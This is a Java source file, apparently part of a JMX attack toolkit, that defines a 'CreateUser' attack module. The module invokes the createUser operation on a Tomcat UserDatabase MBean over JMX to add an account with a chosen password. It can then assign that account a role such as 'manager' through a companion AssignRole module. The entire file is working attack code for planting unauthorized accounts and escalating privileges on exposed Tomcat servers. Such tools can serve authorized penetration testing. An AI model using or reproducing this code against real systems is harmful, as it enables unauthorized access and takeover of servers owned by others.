package jmxattacks;



import javax.management.ObjectName;


import org.apache.commons.cli.CommandLine;
import org.apache.commons.cli.OptionBuilder;
import org.apache.commons.cli.Options;
import org.apache.commons.cli.ParseException;
import org.apache.commons.cli.Parser;

import jmxmenus.MainMenu;
import jmxutils.EasyBasicParser;

public class CreateUser extends Attack{
	String banner = "Please enter options for this module or back to return to the main menu";
	String example = "--username admin --password adminpassword --roles manager";
	String description = "This attack will create a user to access Tomcat application's";
	String name = "CreateUser";
	private String username;
	private String password;
	private String role;
	private ObjectName object ;
	private String mbean = "Users:type=UserDatabase,database=UserDatabase";
	private String operation = "createUser";
	
	public CreateUser()
	{
		
		this.setAttack_description(description);
		this.setAttack_name(name);	
	}
	public void prepareExploit(String arg)
	{
		
		this.setAttack_description(description);
		this.setAttack_name(name);	
		this.object = createObject(this.mbean);
		if (this.object != null)
		{ 
			Parser parser = new EasyBasicParser();
			CommandLine line = null;
			try {
				line = parser.parse( this.setArgs(), StringtoArrayList(arg));
			} catch (ParseException e) {
				System.err.println( "Parsing failed.  Reason: " + e.getMessage() );
				System.exit(-1);
			}
					
			if (line != null)
			{
			    this.username = line.getOptionValue("username");
			    this.password = line.getOptionValue("password");
			    if (line.hasOption("role"))
			    {
			    	this.role = line.getOptionValue("role");
			    }
			    
			    System.out.println("#### " +this.operation+ " operation will be invoke ####");
			    this.exploit();
			    
			    System.out.println("\n User should be created");
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());	
				}
				if (this.role != null)
				{
					AssignRole role = new AssignRole();
					role.prepareExploit("--username "+this.username+ " --role "+this.role);
				}
			}
			
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
	}
	
	public void prepareExploit() {
		
		System.out.println(this.name+" exploit selected");
		this.object = createObject(this.mbean);
		if (this.object != null)
		{ 
			// Display Menu to retrieve options
			CommandLine line = attackMenu(this.setArgs(),this.banner,this.example);
			
			if (line != null)
			{
			    this.username = line.getOptionValue("username");
			    this.password = line.getOptionValue("password");
			    if (line.hasOption("role"))
			    {
			    	this.role = line.getOptionValue("role");
			    }
			    
			    System.out.println("#### " +this.operation+ " operation will be invoke ####");
			    this.exploit();
			    
			    System.out.println("\n User should be created");
				try {
					Thread.sleep(2000);
				} catch (InterruptedException e) {
					System.out.println(e.getMessage());	
				}
				
				if (this.role != null)
				{
					AssignRole role = new AssignRole();
					role.prepareExploit("--username "+this.username+ " --role "+this.role);
				}
			}
			
		}
		else
		{
			System.out.println("Error the object cannot be instanciated. Does the operation " + this.operation + " is available on " + this.mbean + " ?\nReturn to the main menu \n");
		}
			MainMenu menu = new MainMenu();
		
	}

	private Options setArgs()
	{
		Options options = new Options();
		options.addOption("h", "help", true, "prints the help content");
		   options.addOption(OptionBuilder
			       .withArgName("username")
			       .withLongOpt("username")
			       .hasArg()
			       .isRequired()
			       .withDescription("username to add")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("password")
			       .withLongOpt("password")
			       .hasArg()
			       .isRequired()
			       .withDescription("password")
			       .create());
		   options.addOption(OptionBuilder
			       .withArgName("role")
			       .withLongOpt("role")
			       .hasArg()
			       .withDescription("password")
			       .create());
		   
		   return options;
	}
	
	public void exploit()
	{
		// Prepare createUser invocation
				Object retour;
		        Object[] a = new Object[3];
		        a[0] = this.username;
		        a[1] = this.password;
		        a[2] = "";
		        String[] b = new String[3];
		        b[0] = "java.lang.String";
		        b[1]="java.lang.String";
		        b[2]="java.lang.String";
		   // Invoke createUser
				invoke(this.object,this.operation,a, b);
				
	}

}
